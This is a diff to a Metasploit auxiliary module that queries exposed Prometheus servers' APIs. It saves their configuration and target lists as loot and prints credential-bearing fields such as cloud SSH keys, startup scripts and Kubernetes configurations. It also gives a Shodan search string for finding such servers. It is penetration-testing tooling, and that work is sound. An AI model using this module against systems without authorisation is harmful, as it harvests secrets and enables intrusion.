@@ -11,10 +11,20 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Prometheus Information Gather',
+        'Name' => 'Prometheus API Information Gather',
         'Description' => %q{
-          docker run --name prometheus -d -p 127.0.0.1:9090:9090 prom/prometheus
-          "http.favicon.hash:-1399433489"
+          This module utilizes Prometheus' API calls to gather information about
+          the server's configuration, and targets. Fields which may contain
+          credentials, or credential file names are then pulled out and printed.
+
+          Targets may have a wealth of information, this module will print the following
+          values when found:
+          __meta_gce_metadata_ssh_keys, __meta_gce_metadata_startup_script,
+          __meta_gce_metadata_kube_env, kubernetes_sd_configs,
+          _meta_kubernetes_pod_annotation_kubectl_kubernetes_io_last_applied_configuration,
+          __meta_ec2_tag_CreatedBy, __meta_ec2_tag_OwnedBy
+
+          Shodan search: "http.favicon.hash:-1399433489"
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -27,7 +37,7 @@ class MetasploitModule < Msf::Auxiliary
         'Targets' => [
           [ 'Automatic Target', {}]
         ],
-        'DisclosureDate' => '2013-04-18', # XXX update
+        'DisclosureDate' => '2016-07-01', # Prometheus 1.0 release date, who knows....
         'DefaultTarget' => 0,
         'Notes' => {
           'Stability' => [CRASH_SAFE],
@@ -70,10 +80,15 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::UnexpectedReply, "#{peer} - Unable to parse JSON document") unless json
     yaml = json.dig('data', 'yaml')
     fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response from server (unable to find yaml)") unless yaml
-    yamlconf = YAML.safe_load(yaml)
-    loot_path = store_loot('Prometheus YAML Config', 'application/yaml', datastore['RHOST'], yaml, 'config.yaml')
-    print_good("YAML config saved to #{loot_path}")
-    prometheus_config_eater(yamlconf)
+    begin
+      yamlconf = YAML.safe_load(yaml)
+      loot_path = store_loot('Prometheus YAML Config', 'application/yaml', datastore['RHOST'], yaml, 'config.yaml')
+      print_good("YAML config saved to #{loot_path}")
+      prometheus_config_eater(yamlconf)
+    rescue Psych::DisallowedClass
+      # [-] Auxiliary failed: Psych::DisallowedClass Tried to load unspecified class: Symbol
+      print_bad('Unable to load YAML')
+    end
 
     vprint_status("#{peer} - Checking targets")
     res = send_request_cgi(
@@ -91,7 +106,7 @@ class MetasploitModule < Msf::Auxiliary
     )
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response from server (response code #{res.code})") unless res.code == 200
-    # XXX look for leaking usernames and host names
+
     json = res.get_json_document
     fail_with(Failure::UnexpectedReply, "#{peer} - Unable to parse JSON document") unless json
     loot_path = store_loot('Prometheus JSON targets', 'application/json', datastore['RHOST'], json.to_json, 'targets.json')
@@ -114,11 +129,6 @@ class MetasploitModule < Msf::Auxiliary
           key,
           target.dig('discoveredLabels', key)
         ]
-        # __meta_gce_metadata_ssh_keys
-        # __meta_gce_metadata_startup_script
-        # __meta_gce_metadata_kube_env
-        # kubernetes_sd_configs
-        # _meta_kubernetes_pod_annotation_kubectl_kubernetes_io_last_applied_configuration
       end
     end
 
